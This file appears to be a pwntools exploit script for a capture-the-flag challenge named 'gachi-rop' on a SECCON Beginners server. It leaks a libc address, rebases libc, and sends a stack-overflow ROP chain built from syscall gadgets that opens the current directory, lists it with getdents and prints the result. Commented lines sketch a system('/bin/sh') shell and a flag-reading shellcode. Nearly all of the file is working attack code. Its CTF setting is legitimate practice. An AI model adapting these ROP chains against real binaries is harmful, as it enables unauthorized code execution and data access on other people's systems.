from pwn import *

context.arch='amd64'

libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = remote('gachi-rop.beginners.seccon.games', 4567)
# p = process('./gachi-rop')
# p = gdb.debug('./gachi-rop', '''
# b main
# r
# ''')

libc_system_bs = p.recvline().split(b'@')[1]
libc_system = int(libc_system_bs, 16)
print('[*] libc_system: ' + hex(libc_system))

system_offset = libc.symbols['system'] - libc.address
libc.address = libc_system - system_offset
print('[*] libc_base: ' + hex(libc.address))

# libc_binsh = next(libc.search(b"/bin/sh"))
# # libc_binsh = libc.address + 0x1d8678
# print('[*] libc_binsh: ' + hex(libc_binsh))

# Gadgets

# https://volticks.github.io/blacklist-revenge-writeup/
# https://python3-pwntools.readthedocs.io/en/latest/rop/rop.html
rop = ROP('./libc.so.6', base=libc.address)
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
pop_rax = rop.rax.address
pop_rcx = rop.rcx.address
pop_rdx = rop.rdx.address
push_rax = libc.address + 0x00041d9d
mov_rcx_rdx_ret = libc.address + 0x001919b0
mov_rdx_rax_ret = libc.address + 0x0008f158
buf_address = 0x404000
syscall = rop.syscall.address

def mov(addr, value):
    chain = [
        pop_rcx,
        p64(addr),
        pop_rdx,
        value,
        mov_rcx_rdx_ret
    ]
    return flat(chain)

def open(pathname, flags):
    chain = [
        # Write pathname to buf
        mov(buf_address, pathname),
        # Write buf_address to rdi
        pop_rdi,
        buf_address,
        # Write flags to rsi
        pop_rsi,
        p64(flags),
        # Call open
        pop_rax,
        p64(2),
        syscall
    ]
    return flat(chain)

def getdents(fd, dirp, count):
    chain = [
        # Write fd to rdi
        pop_rdi,
        p64(fd),
        # Write dirp to rsi
        pop_rsi,
        p64(dirp),
        # Write count to rdx
        pop_rdx,
        p64(count),
        # Call getdents
        pop_rax,
        p64(78),
        syscall
    ]
    return flat(chain)

def write(fd, buf, count):
    chain = [
        # Write fd to rdi
        pop_rdi,
        p64(fd),
        # Write buf to rsi
        pop_rsi,
        p64(buf),
        # Write count to rdx
        pop_rdx,
        p64(count),
        # Call write
        pop_rax,
        p64(1),
        syscall
    ]
    return flat(chain)

p.recvuntil(b'Name: ')

# p.sendline(b'A'*24 + p64(libc.address + 0x12ee11) + p64(libc_binsh) + p64(libc_system))
# shellcode += asm( shellcraft.amd64.linux.cat('./flag.txt') )
# p.sendline(b'A'*24 + p64(libc.address + 0x4f30b) + shellcode)

chain = [
    open(b'.\x00\x00\x00\x00\x00\x00\x00', 0),
    getdents(3, buf_address, 256),
    write(1, buf_address, 256)
]

p.sendline( b'A'*24 + flat(chain) )

# fd = open(?, /* O_RDONLY */ 0)
# read(fd, buf, 256)
# write(1, buf, 256)

p.interactive()
